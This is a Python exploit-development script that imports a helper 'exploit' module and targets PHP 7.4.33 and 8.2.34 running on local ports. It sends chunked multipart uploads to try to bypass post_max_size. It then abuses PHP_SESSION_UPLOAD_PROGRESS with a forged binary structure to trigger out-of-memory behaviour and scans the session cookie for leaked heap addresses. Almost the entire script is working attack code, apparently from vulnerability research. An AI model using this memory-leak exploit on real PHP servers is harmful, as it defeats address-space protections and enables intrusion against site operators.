"""Try chunked multipart (Transfer-Encoding: chunked) to bypass post_max_size
on 7.4.33 and 8.2.34. The research found that post_max_size is checked only
against the declared Content-Length, not the decoded body size. With chunked
encoding, there's no Content-Length, so post_max_size might not be enforced.
"""
import sys, os, time, struct, http.client
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E
from collections import Counter

def test_chunked(port, field_mb, label):
    """Send a large field using chunked transfer encoding."""
    host = "127.0.0.1"
    port = port
    print(f"  {label}: chunked {field_mb}MB field", flush=True)

    # Build the multipart body
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
    ]
    parts.append({"name": "big", "data": b"B" * int(field_mb * 1024 * 1024)})
    boundary = b"S" * 17
    body = E.build_multipart(parts, boundary)

    # Send using chunked transfer encoding
    conn = http.client.HTTPConnection(host, port, timeout=180)
    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary.decode()}",
        "Transfer-Encoding": "chunked",
    }
    try:
        conn.request("POST", "/", body=body, headers=headers)
        resp = conn.getresponse()
        status = resp.status
        resp_body = resp.read(1024)
        print(f"    Status: {status}", flush=True)
        print(f"    Body: {resp_body[:200]}", flush=True)
    except Exception as e:
        print(f"    ERROR: {e}", flush=True)
    finally:
        conn.close()

    time.sleep(0.5)

    # Try to leak
    t = E.Target(f"http://{host}:{port}/", timeout=180.0, verbose=False)
    parts = [
        {"name": "PHPSESSID", "data": E.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(841):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    try:
        r2 = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20, timeout=180)
    except Exception as e:
        print(f"    REQUEST2 ERROR: {e}", flush=True)
        return False
    raw = E.parse_cookie(r2)
    oom = len(raw) > 100
    c = Counter()
    for i in range(0, len(raw) - 8, 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x700000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    chunk = c.most_common(1)[0][0] if c else 0
    tag = " *** OOM/LEAK ***" if oom else "(no OOM)"
    chunk_str = f" chunk=0x{chunk:x}" if chunk else ""
    print(f"    cookie={len(raw)}B{tag}{chunk_str}", flush=True)
    return oom

print("=== Chunked multipart OOM test ===", flush=True)
print("\n--- 7.4.33 (port 18108) ---", flush=True)
test_chunked(18108, 12, "7.4.33")
time.sleep(1)
test_chunked(18108, 64, "7.4.33")
time.sleep(1)

print("\n--- 8.2.34 (port 18111) ---", flush=True)
test_chunked(18111, 12, "8.2.34")
time.sleep(1)

print("\n--- 8.4.26 control (port 18113) ---", flush=True)
test_chunked(18113, 12, "8.4.26")
time.sleep(1)

print("\n=== done ===", flush=True)
